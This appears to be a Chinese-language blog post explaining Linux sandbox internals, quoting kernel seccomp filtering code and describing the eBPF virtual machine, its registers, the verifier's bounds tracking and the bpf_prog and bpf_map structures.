<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">long</span></span><br><span class="line">__syscall_enter_from_user_work(struct pt_regs *regs, <span class="keyword">long</span> syscall)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> ti_work;</span><br><span class="line"></span><br><span class="line">	ti_work = READ_ONCE(current_thread_info()-&gt;flags);</span><br><span class="line">	<span class="keyword">if</span> (ti_work &amp; SYSCALL_ENTER_WORK)</span><br><span class="line">		syscall = syscall_trace_enter(regs, syscall, ti_work);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> syscall;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">syscall_trace_enter</span><span class="params">(struct pt_regs *regs, <span class="keyword">long</span> syscall,</span></span></span><br><span class="line"><span class="params"><span class="function">				<span class="keyword">unsigned</span> <span class="keyword">long</span> ti_work)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">long</span> ret = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">if</span> (ti_work &amp; _TIF_SECCOMP) &#123;</span><br><span class="line">		ret = __secure_computing(<span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (ret == <span class="number">-1L</span>)</span><br><span class="line">			<span class="keyword">return</span> ret;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret ? : syscall;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __secure_computing(<span class="keyword">const</span> struct seccomp_data *sd)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> mode = current-&gt;seccomp.mode;</span><br><span class="line">	<span class="keyword">int</span> this_syscall;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (IS_ENABLED(CONFIG_CHECKPOINT_RESTORE) &amp;&amp;</span><br><span class="line">	    unlikely(current-&gt;ptrace &amp; PT_SUSPEND_SECCOMP))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	this_syscall =</span><br><span class="line">		sd ? sd-&gt;nr : syscall_get_nr(current, task_pt_regs(current));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (mode) &#123;</span><br><span class="line">	<span class="keyword">case</span> SECCOMP_MODE_STRICT:</span><br><span class="line">		__secure_computing_strict(this_syscall); <span class="comment">/* may call do_exit */</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">case</span> SECCOMP_MODE_FILTER:</span><br><span class="line">		<span class="keyword">return</span> __seccomp_filter(this_syscall, sd, <span class="literal">false</span>);</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		BUG();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __seccomp_filter(<span class="keyword">int</span> this_syscall, <span class="keyword">const</span> struct seccomp_data *sd,</span><br><span class="line">			    <span class="keyword">const</span> <span class="keyword">bool</span> recheck_after_trace)</span><br><span class="line">&#123;</span><br><span class="line">	u32 filter_ret, action;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">seccomp_filter</span> *<span class="title">match</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">int</span> data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">seccomp_data</span> <span class="title">sd_local</span>;</span></span><br><span class="line"></span><br><span class="line">	rmb();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!sd) &#123;</span><br><span class="line">		populate_seccomp_data(&amp;sd_local);</span><br><span class="line">		sd = &amp;sd_local;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	filter_ret = seccomp_run_filters(sd, &amp;match);</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">    </span><br><span class="line">skip:</span><br><span class="line">	seccomp_log(this_syscall, <span class="number">0</span>, action, match ? match-&gt;<span class="built_in">log</span> : <span class="literal">false</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>指令过滤函数 <code>seccomp_run_filters</code> 的源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> u32 <span class="title">seccomp_run_filters</span><span class="params">(<span class="keyword">const</span> struct seccomp_data *sd,</span></span></span><br><span class="line"><span class="params"><span class="function">			       struct seccomp_filter **match)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	u32 ret = SECCOMP_RET_ALLOW;</span><br><span class="line">	<span class="comment">/* Make sure cross-thread synced filter points somewhere sane. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">seccomp_filter</span> *<span class="title">f</span> =</span> READ_ONCE(current-&gt;seccomp.filter);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Ensure unexpected behavior doesn&#x27;t result in failing open. */</span></span><br><span class="line">	<span class="keyword">if</span> (WARN_ON(f == <span class="literal">NULL</span>))</span><br><span class="line">		<span class="keyword">return</span> SECCOMP_RET_KILL_PROCESS;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * All filters in the list are evaluated and the lowest BPF return</span></span><br><span class="line"><span class="comment">	 * value always takes priority (ignoring the DATA).</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">for</span> (; f; f = f-&gt;prev) &#123;</span><br><span class="line">		u32 cur_ret = bpf_prog_run_pin_on_cpu(f-&gt;prog, sd); <span class="comment">/* 用于运行BPF程序的函数 */</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (ACTION_ONLY(cur_ret) &lt; ACTION_ONLY(ret)) &#123;</span><br><span class="line">			ret = cur_ret;</span><br><span class="line">			*match = f;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>bpf_prog_run_pin_on_cpu</code> 是一个用于运行 BPF 程序的函数，该函数将 BPF 程序加载到指定 CPU 的内存中，并将其附加到指定 CPU 的运行队列中 </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> u32 <span class="title">bpf_prog_run_pin_on_cpu</span><span class="params">(<span class="keyword">const</span> struct bpf_prog *prog,</span></span></span><br><span class="line"><span class="params"><span class="function">					  <span class="keyword">const</span> <span class="keyword">void</span> *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	u32 ret;</span><br><span class="line"></span><br><span class="line">	migrate_disable(); <span class="comment">/* 禁用内核进程迁移 */</span></span><br><span class="line">	ret = __BPF_PROG_RUN(prog, ctx, bpf_dispatcher_nop_func); <span class="comment">/* 运行BPF程序 */</span></span><br><span class="line">	migrate_enable(); <span class="comment">/* 启用内核进程迁移 */</span></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>eBPF 虚拟机</strong></p>
<p>Linux 下 eBPF 的整体架构如下图所示：</p>
<img src="/2023/11/21/Principles%EF%BC%9A%E6%B2%99%E7%9B%92%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/1700624107072.png" class width="1700624107072">  
<ul>
<li>传入：用户进程首先在用户空间编写相应的 BPF 字节码程序，传入内核</li>
<li>检查：内核通过 <code>verifier</code> 对字节码程序进行安全性检查</li>
<li>编译 or 解释：通过检查后便通过 JIT 编译运行，或者直接解释运行 BPF 字节码</li>
<li>映射：用以保存数据的通用结构，可以在不同的 eBPF 程序之间或是用户进程与内核间共享数据（不同的 eBPF 程序之间可以共享同一个映射）</li>
</ul>
<p>eBPF 底层是一个使用 RISC 指令集的虚拟机，使用11个64位寄存器和一个固定大小为512字节的栈：</p>
<ul>
<li>其中9个寄存器是通用寄存器</li>
<li>一个只读栈帧寄存器</li>
</ul>
<p>寄存器总是64位大小，在32位机器上会默认把前32位置零，这也为 eBPF 提供了交叉编译的兼容性，各个寄存器的功能如下：</p>
<ul>
<li>R0: RAX，存放函数返回值或程序退出状态码</li>
<li>R1: RDI，第一个实参</li>
<li>R2: RSI，第二个实参</li>
<li>R3: RDX，第三个实参</li>
<li>R4: RCX，第四个实参</li>
<li>R5: R8，第五个实参</li>
<li>R6: RBX，callee saved</li>
<li>R7: R13，callee saved</li>
<li>R8: R14，callee saved</li>
<li>R9: R15，callee saved</li>
<li>R10: RBP，只读栈帧</li>
</ul>
<p>在 eBPF 中，一个寄存器的状态信息使用 <code>bpf_reg_state</code> 进行表示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_reg_state</span> &#123;</span></span><br><span class="line">	<span class="comment">/* Ordering of fields matters.  See states_equal() */</span></span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">bpf_reg_type</span> <span class="title">type</span>;</span> <span class="comment">/* 记录寄存器类型 */</span></span><br><span class="line">	<span class="comment">/* Fixed part of pointer offset, pointer types only */</span></span><br><span class="line">	s32 off;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="comment">/* valid when type == PTR_TO_PACKET */</span></span><br><span class="line">		<span class="keyword">int</span> range;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* valid when type == CONST_PTR_TO_MAP | PTR_TO_MAP_VALUE |</span></span><br><span class="line"><span class="comment">		 *   PTR_TO_MAP_VALUE_OR_NULL</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map_ptr</span>;</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">/* for PTR_TO_BTF_ID */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">btf</span> *<span class="title">btf</span>;</span></span><br><span class="line">			u32 btf_id;</span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		u32 mem_size; <span class="comment">/* for PTR_TO_MEM | PTR_TO_MEM_OR_NULL */</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Max size from any of the above. */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="keyword">unsigned</span> <span class="keyword">long</span> raw1;</span><br><span class="line">			<span class="keyword">unsigned</span> <span class="keyword">long</span> raw2;</span><br><span class="line">		&#125; raw;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="comment">/* For PTR_TO_PACKET, used to find other pointers with the same variable</span></span><br><span class="line"><span class="comment">	 * offset, so they can share range knowledge.</span></span><br><span class="line"><span class="comment">	 * For PTR_TO_MAP_VALUE_OR_NULL this is used to share which map value we</span></span><br><span class="line"><span class="comment">	 * came from, when one is tested for != NULL.</span></span><br><span class="line"><span class="comment">	 * For PTR_TO_MEM_OR_NULL this is used to identify memory allocation</span></span><br><span class="line"><span class="comment">	 * for the purpose of tracking that it&#x27;s freed.</span></span><br><span class="line"><span class="comment">	 * For PTR_TO_SOCKET this is used to share which pointers retain the</span></span><br><span class="line"><span class="comment">	 * same reference to the socket, to determine proper reference freeing.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	u32 id;</span><br><span class="line">	<span class="comment">/* PTR_TO_SOCKET and PTR_TO_TCP_SOCK could be a ptr returned</span></span><br><span class="line"><span class="comment">	 * from a pointer-cast helper, bpf_sk_fullsock() and</span></span><br><span class="line"><span class="comment">	 * bpf_tcp_sock().</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Consider the following where &quot;sk&quot; is a reference counted</span></span><br><span class="line"><span class="comment">	 * pointer returned from &quot;sk = bpf_sk_lookup_tcp();&quot;:</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * 1: sk = bpf_sk_lookup_tcp();</span></span><br><span class="line"><span class="comment">	 * 2: if (!sk) &#123; return 0; &#125;</span></span><br><span class="line"><span class="comment">	 * 3: fullsock = bpf_sk_fullsock(sk);</span></span><br><span class="line"><span class="comment">	 * 4: if (!fullsock) &#123; bpf_sk_release(sk); return 0; &#125;</span></span><br><span class="line"><span class="comment">	 * 5: tp = bpf_tcp_sock(fullsock);</span></span><br><span class="line"><span class="comment">	 * 6: if (!tp) &#123; bpf_sk_release(sk); return 0; &#125;</span></span><br><span class="line"><span class="comment">	 * 7: bpf_sk_release(sk);</span></span><br><span class="line"><span class="comment">	 * 8: snd_cwnd = tp-&gt;snd_cwnd;  // verifier will complain</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * After bpf_sk_release(sk) at line 7, both &quot;fullsock&quot; ptr and</span></span><br><span class="line"><span class="comment">	 * &quot;tp&quot; ptr should be invalidated also.  In order to do that,</span></span><br><span class="line"><span class="comment">	 * the reg holding &quot;fullsock&quot; and &quot;sk&quot; need to remember</span></span><br><span class="line"><span class="comment">	 * the original refcounted ptr id (i.e. sk_reg-&gt;id) in ref_obj_id</span></span><br><span class="line"><span class="comment">	 * such that the verifier can reset all regs which have</span></span><br><span class="line"><span class="comment">	 * ref_obj_id matching the sk_reg-&gt;id.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * sk_reg-&gt;ref_obj_id is set to sk_reg-&gt;id at line 1.</span></span><br><span class="line"><span class="comment">	 * sk_reg-&gt;id will stay as NULL-marking purpose only.</span></span><br><span class="line"><span class="comment">	 * After NULL-marking is done, sk_reg-&gt;id can be reset to 0.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * After &quot;fullsock = bpf_sk_fullsock(sk);&quot; at line 3,</span></span><br><span class="line"><span class="comment">	 * fullsock_reg-&gt;ref_obj_id is set to sk_reg-&gt;ref_obj_id.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * After &quot;tp = bpf_tcp_sock(fullsock);&quot; at line 5,</span></span><br><span class="line"><span class="comment">	 * tp_reg-&gt;ref_obj_id is set to fullsock_reg-&gt;ref_obj_id</span></span><br><span class="line"><span class="comment">	 * which is the same as sk_reg-&gt;ref_obj_id.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * From the verifier perspective, if sk, fullsock and tp</span></span><br><span class="line"><span class="comment">	 * are not NULL, they are the same ptr with different</span></span><br><span class="line"><span class="comment">	 * reg-&gt;type.  In particular, bpf_sk_release(tp) is also</span></span><br><span class="line"><span class="comment">	 * allowed and has the same effect as bpf_sk_release(sk).</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	u32 ref_obj_id;</span><br><span class="line">	<span class="comment">/* For scalar types (SCALAR_VALUE), this represents our knowledge of</span></span><br><span class="line"><span class="comment">	 * the actual value.</span></span><br><span class="line"><span class="comment">	 * For pointer types, this represents the variable part of the offset</span></span><br><span class="line"><span class="comment">	 * from the pointed-to object, and is shared with all bpf_reg_states</span></span><br><span class="line"><span class="comment">	 * with the same id as us.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">var_off</span>;</span></span><br><span class="line">	<span class="comment">/* Used to determine if any memory access using this register will</span></span><br><span class="line"><span class="comment">	 * result in a bad access.</span></span><br><span class="line"><span class="comment">	 * These refer to the same value as var_off, not necessarily the actual</span></span><br><span class="line"><span class="comment">	 * contents of the register.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	s64 smin_value; <span class="comment">/* minimum possible (s64)value */</span></span><br><span class="line">	s64 smax_value; <span class="comment">/* maximum possible (s64)value */</span></span><br><span class="line">	u64 umin_value; <span class="comment">/* minimum possible (u64)value */</span></span><br><span class="line">	u64 umax_value; <span class="comment">/* maximum possible (u64)value */</span></span><br><span class="line">	s32 s32_min_value; <span class="comment">/* minimum possible (s32)value */</span></span><br><span class="line">	s32 s32_max_value; <span class="comment">/* maximum possible (s32)value */</span></span><br><span class="line">	u32 u32_min_value; <span class="comment">/* minimum possible (u32)value */</span></span><br><span class="line">	u32 u32_max_value; <span class="comment">/* maximum possible (u32)value */</span></span><br><span class="line">	<span class="comment">/* parentage chain for liveness checking */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_reg_state</span> *<span class="title">parent</span>;</span></span><br><span class="line">	<span class="comment">/* Inside the callee two registers can be both PTR_TO_STACK like</span></span><br><span class="line"><span class="comment">	 * R1=fp-8 and R2=fp-8, but one of them points to this function stack</span></span><br><span class="line"><span class="comment">	 * while another to the caller&#x27;s stack. To differentiate them &#x27;frameno&#x27;</span></span><br><span class="line"><span class="comment">	 * is used which is an index in bpf_verifier_state-&gt;frame[] array</span></span><br><span class="line"><span class="comment">	 * pointing to bpf_func_state.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	u32 frameno;</span><br><span class="line">	<span class="comment">/* Tracks subreg definition. The stored value is the insn_idx of the</span></span><br><span class="line"><span class="comment">	 * writing insn. This is safe because subreg_def is used before any insn</span></span><br><span class="line"><span class="comment">	 * patching which only happens after main verification finished.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	s32 subreg_def;</span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">bpf_reg_liveness</span> <span class="title">live</span>;</span></span><br><span class="line">	<span class="comment">/* if (!precise &amp;&amp; SCALAR_VALUE) min/max/tnum don&#x27;t affect safety */</span></span><br><span class="line">	<span class="keyword">bool</span> precise;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>当 eBPF 字节码载入到内核中后，verifier 会对 eBPF 字节码进行一系列的检查，主要关注以下几个字段：</p>
<ul>
<li><code>smin_value</code>、<code>smax_value</code>：64 位有符号的值的可能取值边界</li>
<li><code>umin_value</code>、<code>umax_value</code>：64 位无符号的值的可能取值边界</li>
<li><code>s32_min_value</code>、<code>s32_max_value</code>：32 位有符号的值的可能取值边界</li>
<li><code>u32_min_value</code>、<code>u32_max_value</code>：32 位无符号的值的可能取值边界</li>
</ul>
<p>核心检查函数就是 <code>bpf_check</code>，一个静态代码分析器：</p>
<ul>
<li>逐条遍历 eBPF 程序中的指令并更新寄存器 / 堆栈的状态，条件分支的所有路径都会被分析，直到 <code>bpf_exit</code> 指令</li>
<li>这其实是一个模拟执行的过程，verifier 会推测寄存器的边界值，检查其是否符合规则</li>
<li>模拟通过后才能正常加载 eBPF 程序</li>
</ul>
<p>在其中用于检测指令合法性的函数为 <code>do_check</code>，该函数会遍历每一条指令并根据指令的不同类型进行不同操作，对于算术指令（<code>BPF_ALU</code> / <code>BPF_ALU64</code>）而言有如下调用链</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">do_check()        					<span class="comment">// 遍历每一条指令并根据类型调用相应函数处理</span></span><br><span class="line">-&gt;check_alu_op()       				 <span class="comment">// 根据算术指令的opcode进行不同处理</span></span><br><span class="line">-&gt;adjust_reg_min_max_vals()        	<span class="comment">// 计算新的寄存器边界值</span></span><br><span class="line">-&gt;adjust_scalar_min_max_vals()		<span class="comment">// 根据opcode计算具体的新边界值</span></span><br></pre></td></tr></table></figure>
<p>当 eBPF 字节码载入到内核中后，内核最终会使用一个 <code>bpf_prog</code> 结构体来表示一个 eBPF 程序： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_prog</span> &#123;</span></span><br><span class="line">	u16			pages;		<span class="comment">/* Number of allocated pages */</span></span><br><span class="line">	u16			jited:<span class="number">1</span>,	<span class="comment">/* Is our filter JIT&#x27;ed? */</span></span><br><span class="line">				jit_requested:<span class="number">1</span>,<span class="comment">/* archs need to JIT the prog */</span></span><br><span class="line">				gpl_compatible:<span class="number">1</span>, <span class="comment">/* Is filter GPL compatible? */</span></span><br><span class="line">				cb_access:<span class="number">1</span>,	<span class="comment">/* Is control block accessed? */</span></span><br><span class="line">				dst_needed:<span class="number">1</span>,	<span class="comment">/* Do we need dst entry? */</span></span><br><span class="line">				blinded:<span class="number">1</span>,	<span class="comment">/* Was blinded */</span></span><br><span class="line">				is_func:<span class="number">1</span>,	<span class="comment">/* program is a bpf function */</span></span><br><span class="line">				kprobe_override:<span class="number">1</span>, <span class="comment">/* Do we override a kprobe? */</span></span><br><span class="line">				has_callchain_buf:<span class="number">1</span>, <span class="comment">/* callchain buffer allocated? */</span></span><br><span class="line">				enforce_expected_attach_type:<span class="number">1</span>, <span class="comment">/* Enforce expected_attach_type checking at attach time */</span></span><br><span class="line">				call_get_stack:<span class="number">1</span>; <span class="comment">/* Do we call bpf_get_stack() or bpf_get_stackid() */</span></span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">bpf_prog_type</span>	<span class="title">type</span>;</span>		<span class="comment">/* Type of BPF program */</span></span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">bpf_attach_type</span>	<span class="title">expected_attach_type</span>;</span> <span class="comment">/* For some prog types */</span></span><br><span class="line">	u32			len;		<span class="comment">/* Number of filter blocks */</span></span><br><span class="line">	u32			jited_len;	<span class="comment">/* Size of jited insns in bytes */</span></span><br><span class="line">	u8			tag[BPF_TAG_SIZE];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_prog_aux</span>	*<span class="title">aux</span>;</span>		<span class="comment">/* Auxiliary fields */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog_kern</span>	*<span class="title">orig_prog</span>;</span>	<span class="comment">/* Original BPF program */</span></span><br><span class="line">	<span class="function"><span class="keyword">unsigned</span> <span class="title">int</span>		<span class="params">(*bpf_func)</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *ctx,</span></span></span><br><span class="line"><span class="params"><span class="function">					    <span class="keyword">const</span> struct bpf_insn *insn)</span></span>;</span><br><span class="line">	<span class="comment">/* Instructions for interpreter */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span>	<span class="title">insns</span>[0];</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span>		<span class="title">insnsi</span>[];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>接着就是编译，解释 eBPF 字节码，生成 bpf map 并记录在 <code>bpf_reg_state-&gt;map_ptr</code> 中</p>
<p>bpf map 是一个通用的用以储存不同种类数据的结构，用以在用户进程与 eBPF 程序、eBPF 程序与 eBPF 程序之间进行数据共享（这些数据以二进制形式储存，因此用户在创建时只需要指定 key 与 value 的 size）</p>
<p>核心结构体 <code>bpf_map</code> 如下：</p>
